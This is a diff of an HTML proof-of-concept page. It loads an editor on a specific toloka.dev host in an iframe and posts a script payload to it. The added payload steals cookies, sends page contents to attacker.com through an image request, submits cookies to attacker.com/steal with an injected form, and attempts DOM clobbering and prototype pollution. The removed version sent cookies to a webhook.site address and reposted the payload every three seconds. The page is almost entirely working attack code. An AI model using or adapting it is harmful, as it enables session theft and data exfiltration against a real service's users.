@@ -1,32 +1,65 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC: iframe attack via postMessage</title>
+  <meta charset="UTF-8">
+  <title>PostMessage Attack PoC</title>
+  <style>
+    iframe {
+      width: 100%;
+      height: 600px;
+      border: 2px solid #000;
+    }
+  </style>
 </head>
 <body>
-  <h1>PoC: Sending raw JS payload via postMessage</h1>
+  <h1>PoC: PostMessage Attacks to Sandbox iframe</h1>
+  <iframe id="target" src="https://tb.toloka.dev/editor?view.iframe"></iframe>
 
   <script>
+    const targetOrigin = "https://tb.toloka.dev";
+
     const payload = `
-      console.log('🔥 Executed from child iframe');
-      document.body.innerHTML += '<h1 style="color:red">Exploit Successful 🔥</h1>';
-      fetch('https://webhook.site/xxx?cookie=' + encodeURIComponent(document.cookie));
+      <script>
+      // 1. Steal cookie
+      try {
+        parent.postMessage("[COOKIE] " + document.cookie, "*");
+      } catch(e) {}
+
+      // 2. DOM Clobbering
+      var input = document.createElement('input');
+      input.name = 'toString';
+      document.body.appendChild(input);
+
+      // 3. Image Exfiltration (Blind SSR)
+      var i = new Image();
+      i.src = "https://attacker.com/log?d=" + encodeURIComponent(document.body.innerHTML);
+      document.body.appendChild(i);
+
+      // 4. Formjacking
+      var f = document.createElement("form");
+      f.action = "https://attacker.com/steal";
+      f.method = "POST";
+      var inp = document.createElement("input");
+      inp.name = "stolen";
+      inp.value = document.cookie;
+      f.appendChild(inp);
+      document.body.appendChild(f);
+      f.submit();
+
+      // 5. JS Prototype Pollution
+      Object.prototype.polluted = true;
+      </script>
     `;
 
-    const message = {
-      type: "exploit-payload",
-      payload: payload,
-      origin: location.origin,
-      time: new Date().toISOString()
+    const sendPayload = () => {
+      const iframe = document.getElementById("target");
+      iframe.onload = () => {
+        iframe.contentWindow.postMessage(payload, targetOrigin);
+      };
     };
 
-    console.log("📤 Sending payload to parent window...");
-    window.parent.postMessage(payload, "*");
-
-    // إعادة الإرسال كل ثواني قليلة لمحاولة اختراق event listener في parent
-    setInterval(() => {
-      window.parent.postMessage(payload, "*");
-    }, 3000);
+    // Send after delay to ensure iframe loaded
+    window.onload = () => setTimeout(sendPayload, 1000);
   </script>
 </body>
 </html>
